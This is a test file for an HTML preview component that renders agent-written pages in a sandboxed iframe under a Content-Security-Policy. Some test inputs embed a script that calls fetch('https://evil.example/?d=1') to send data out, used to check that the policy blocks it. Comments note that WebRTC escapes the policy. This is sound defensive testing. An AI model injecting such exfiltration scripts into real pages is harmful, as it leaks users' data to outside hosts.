import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

import {
  HtmlPreview,
  PREVIEW_CSP,
  inlineStyles,
  leadingDoctypeEnd,
  localStylesheets,
  siblingOf,
  withPreviewPolicy,
} from "@/components/code/HtmlPreview";
import { getFsFile } from "@/lib/api";
import { renderWithProviders } from "@/test/utils";
// What chart.py's `_html` writes, byte for byte: tests/test_chart.py checks the file against it.
import CHART_PAGE from "@/lib/chart/fixtures/render-chart-page.html?raw";

vi.mock("@/lib/api", async () => (await import("@/test/code-api-mock")).makeCodeApiMock());
// The check off the app's thread runs in a Worker, which jsdom does not have (its protocol is tested
// in preflight.test.ts); here it lets every chart through, so these tests see the drawing.
vi.mock("@/lib/chart/preflight", () => ({ preflight: async () => ({ verdict: "draw" }) }));

// Vega is a dynamic import, and the first one of a run can take seconds under a loaded suite.
// Loaded once up front, so each test's wait measures the drawing, not the download.
beforeAll(async () => {
  await import("@/lib/chart/render");
}, 60000);

const PAGINA = `<!doctype html>
<html><head>
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdn.example.com/reset.css">
</head><body><h1>Café Aurora</h1></body></html>`;

/**
 * The page the agent just wrote, shown as a page.
 *
 * The viewer rendered HTML as highlighted source — right for code, wrong for a document. Someone
 * who asked for a landing page and is shown angle brackets cannot tell whether it works, and the
 * defect a non-technical person is best placed to catch is the visual one.
 */
describe("HtmlPreview", () => {
  beforeEach(() => {
    vi.mocked(getFsFile).mockReset().mockResolvedValue({
      content: "h1 { color: rebeccapurple }",
      note: "",
      truncated: false,
    } as never);
  });

  it("renders the page in a frame that cannot reach this app", async () => {
    // The security half, and it is the reason this is `srcdoc` and not a URL: `fs_api.py` refuses
    // to serve .html because the app's bearer token is a <meta> tag in its own index.html, so a
    // same-origin document could read it and drive the API. No `allow-same-origin` means an opaque
    // origin: no API, no storage, no navigating the app.
    const { container } = renderWithProviders(
      <HtmlPreview workspace="/proj" path="index.html" source={PAGINA} />,
    );

    const frame = await waitFor(() => {
      const f = container.querySelector("iframe");
      if (!f) throw new Error("no frame");
      return f;
    });
    const sandbox = frame.getAttribute("sandbox") ?? "";
    expect(sandbox).toContain("allow-scripts");
    expect(sandbox).not.toContain("allow-same-origin");
    expect(frame.getAttribute("src")).toBeNull();
  });

  it("inlines the page's own stylesheet so it does not render unstyled", async () => {
    // A preview that renders every page unstyled is worse than no preview: it shows a broken
    // version of working work, and the person cannot tell which of the two they are looking at.
    const { container } = renderWithProviders(
      <HtmlPreview workspace="/proj" path="index.html" source={PAGINA} />,
    );

    await waitFor(() => expect(getFsFile).toHaveBeenCalled());
    await waitFor(() => {
      const doc = container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";
      expect(doc).toContain("rebeccapurple");
    });
  });

  it("says what it could not show", async () => {
    renderWithProviders(<HtmlPreview workspace="/proj" path="index.html" source={PAGINA} />);

    // Said, not discovered. A preview that silently omits half the page teaches the user to
    // distrust the preview — or, worse, to distrust work that is fine.
    expect(await screen.findByText(/not loaded here|could not be loaded/i)).toBeTruthy();
  });

  it("gives the frame its own policy, ahead of anything the page wrote", async () => {
    // The frame used to have no policy at all: a page's `fetch` or `<img src="https://…">` went
    // wherever it pointed. The meta is the frame's half (the app page's header is the other).
    const { container } = renderWithProviders(
      <HtmlPreview workspace="/proj" path="index.html" source={PAGINA} />,
    );
    await waitFor(() => {
      const doc = container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";
      expect(doc).toContain("rebeccapurple");
    });
    const doc = container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";
    expect(doc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`)).toBe(true);
  });

  it("says exactly what loads: nothing from another site", async () => {
    // It used to name cdn.jsdelivr.net, the one site charts needed. The app draws charts itself
    // now, so no site is admitted, and a note that still named one would be a promise of a hole.
    vi.mocked(getFsFile).mockResolvedValue({ content: "", note: "", truncated: false } as never);
    renderWithProviders(<HtmlPreview workspace="/proj" path="page.html" source="<p>x</p>" />);
    expect(await screen.findByText(/nothing is loaded from another site/)).toBeTruthy();
    expect(screen.queryByText(/jsdelivr/i)).toBeNull();
  });

  it("does not promise a sealed frame, in any language", () => {
    // Measured in Edge with both policies on: the frame's fetch was blocked, but WebRTC reached a
    // STUN server over UDP and a TURN server over TCP — CSP does not govern it. An earlier version
    // of the note said requests to other sites "are blocked", full stop. Every language must name
    // the channel that is still open, so the sentence cannot drift back into a guarantee.
    const [source] = Object.values(
      import.meta.glob("../../lib/i18n.tsx", { query: "?raw", import: "default", eager: true }) as Record<string, string>,
    );
    const notes = [...source.matchAll(/^ {2}"code\.preview\.note": "(.*)",$/gm)].map((m) => m[1]);
    expect(notes).toHaveLength(10);
    for (const note of notes) expect(note).toContain("WebRTC");
  });

  it("draws a page render_chart wrote from its spec, without running the page", async () => {
    // The page loads Vega from a CDN the policy no longer admits; in a frame it would be blank.
    const { container } = renderWithProviders(
      <HtmlPreview workspace="/proj" path="chart.html" source={CHART_PAGE} />,
    );
    expect(container.querySelector("iframe")).toBeNull();
    const view = screen.getByTestId("chart-view");
    expect(view.getAttribute("aria-label")).toBe("Chart: Sales");
    await waitFor(() => expect(view.querySelector("svg")).not.toBeNull(), { timeout: 10000 });
    expect(screen.getByText(/the app draws only the chart, from that spec/)).toBeInTheDocument();
  });

  it("says what it did with a chart page, not who wrote it", () => {
    // Any page with the template's loader and spec element is drawn this way, including one from a
    // cloned repository; the note used to say "a chart written by render_chart" in all ten
    // languages, which the app never checks. It says what the app did instead.
    renderWithProviders(<HtmlPreview workspace="/proj" path="chart.html" source={CHART_PAGE} />);
    expect(screen.getByText(/carries a chart spec/)).toBeInTheDocument();
    expect(screen.queryByText(/render_chart/)).toBeNull();
  });

  it("does not run a chart page that makes up millions of rows, and says why", () => {
    const page = CHART_PAGE.replace('"title": "Sales",', '"title": "Sales", "transform": [{"density": "b", "steps": 5000000}],');
    expect(page).not.toBe(CHART_PAGE);
    renderWithProviders(<HtmlPreview workspace="/proj" path="chart.html" source={page} />);
    expect(screen.getByText(/without freezing the window/)).toBeInTheDocument();
    expect(screen.queryByTestId("chart-view")).toBeNull();
  });

  it("does not draw a chart page whose spec reaches outside itself, and says why", () => {
    const page = CHART_PAGE.replace('"title": "Sales",', '"title": "Sales", "href": "https://example.com/?d=1",');
    expect(page).not.toBe(CHART_PAGE);
    renderWithProviders(<HtmlPreview workspace="/proj" path="chart.html" source={page} />);
    expect(screen.queryByTestId("chart-view")).toBeNull();
    expect(screen.getByText(/loads data or follows links from outside itself/)).toBeInTheDocument();
  });

  it("still offers the source", async () => {
    const user = userEvent.setup();
    const { container } = renderWithProviders(
      <HtmlPreview workspace="/proj" path="index.html" source={PAGINA} />,
    );

    await user.click(await screen.findByRole("button", { name: /show the source/i }));

    expect(container.querySelector("iframe")).toBeNull();
  });
});

describe("what gets inlined", () => {
  it("takes local stylesheets and leaves other people's servers alone", () => {
    // The only way this component could make a network request is by fetching an absolute URL, so
    // it does not: a page that pulls from a CDN shows without it, and the notice says so.
    expect(localStylesheets(PAGINA)).toEqual(["style.css"]);
  });

  it("ignores links that are not stylesheets", () => {
    const html = '<link rel="icon" href="favicon.ico"><link rel="stylesheet" href="a.css">';
    expect(localStylesheets(html)).toEqual(["a.css"]);
  });

  it("replaces the link with the css, and leaves the rest of the markup alone", () => {
    const saida = inlineStyles(PAGINA, new Map([["style.css", "h1{color:red}"]]));
    expect(saida).toContain("<style>");
    expect(saida).toContain("h1{color:red}");
    expect(saida).toContain("Café Aurora");
    // The one it could not fetch stays a link rather than vanishing: the page is reported as it is.
    expect(saida).toContain("cdn.example.com");
  });

  it("resolves a sibling next to the page, not next to the workspace root", () => {
    // A page in a subfolder pulls `style.css` from ITS folder. Resolving against the root would
    // fetch the wrong file, or none, and the preview would quietly render unstyled.
    expect(siblingOf("site/index.html", "style.css")).toBe("site/style.css");
    expect(siblingOf("site/index.html", "./style.css")).toBe("site/style.css");
    expect(siblingOf("index.html", "style.css")).toBe("style.css");
  });
});

describe("the preview policy", () => {
  const policy = (doc: string) => /content="([^"]*)"/.exec(doc)?.[1] ?? "";
  const directive = (csp: string, name: string) =>
    csp.split(";").map((d) => d.trim()).find((d) => d.startsWith(`${name} `)) ?? "";

  it("refuses every way a page sends something out on its own", () => {
    const csp = policy(withPreviewPolicy("<p>x</p>"));
    expect(directive(csp, "default-src")).toBe("default-src 'none'");
    expect(directive(csp, "connect-src")).toBe("connect-src 'none'");
    expect(directive(csp, "img-src")).toBe("img-src data: blob:");
    expect(directive(csp, "font-src")).toBe("font-src data:");
    expect(directive(csp, "frame-src")).toBe("frame-src 'none'");
    expect(directive(csp, "form-action")).toBe("form-action 'none'");
    expect(directive(csp, "object-src")).toBe("object-src 'none'");
    // The page's own inline scripts, and nothing from anywhere else. jsDelivr and 'unsafe-eval' were
    // here for render_chart's pages alone; the app draws those itself now (study 29, P6.1).
    expect(directive(csp, "script-src")).toBe("script-src 'unsafe-inline'");
  });

  it("goes before a script the page opens with, so the script runs under it", () => {
    // A meta policy governs only what follows it. After `<head>` would be too late for this page.
    const page = "<script>fetch('https://evil.example/?d=1')</script><head></head><body></body>";
    const doc = withPreviewPolicy(page);
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<script>"));
    expect(doc.startsWith("<meta ")).toBe(true);
  });

  it("keeps a leading doctype first, so the page stays in standards mode", () => {
    const doc = withPreviewPolicy("<!-- made by the agent -->\n<!DOCTYPE html><html><head></head></html>");
    expect(doc.startsWith("<!-- made by the agent -->\n<!DOCTYPE html><meta ")).toBe(true);
  });

  it("finds the doctype in time however many comments come before it", () => {
    // The regex this replaced backtracked exponentially on leading comments with no doctype after
    // them: 28 took 13 s in node, and the preview computes this on every .html file opened — so a
    // 300-byte page the agent wrote froze the window. Linear now; 40 is far past where it hung.
    const page = "<!--a-->".repeat(40) + "<p>x</p>";
    const started = performance.now();
    const doc = withPreviewPolicy(page);
    expect(performance.now() - started).toBeLessThan(50);
    expect(doc.startsWith("<meta ")).toBe(true);
    // And with a doctype after them, it still lands after the doctype.
    const withDoctype = "<!--a-->".repeat(40) + "<!doctype html><p>x</p>";
    expect(withPreviewPolicy(withDoctype)).toContain("<!doctype html><meta ");
  });

  it("ends a comment where the parser does, so a script after `--!>` cannot run first", () => {
    // `--!>` closes a comment for the HTML parser. Reading only `-->`, the old match took the
    // script below as part of a comment, found the doctype after it, and put the policy after a
    // script the browser runs.
    const page = "<!-- a --!><script>fetch('https://evil.example/?d=1')</script>--><!doctype html><p>x</p>";
    const doc = withPreviewPolicy(page);
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<script>"));
    // The abrupt `<!-->` is a whole comment too, and an unclosed one hides any doctype after it.
    expect(leadingDoctypeEnd("<!-->\n<!DOCTYPE html><p>")).toBe("<!-->\n<!DOCTYPE html>".length);
    expect(leadingDoctypeEnd("<!-- never closed <!doctype html>")).toBe(0);
  });
});
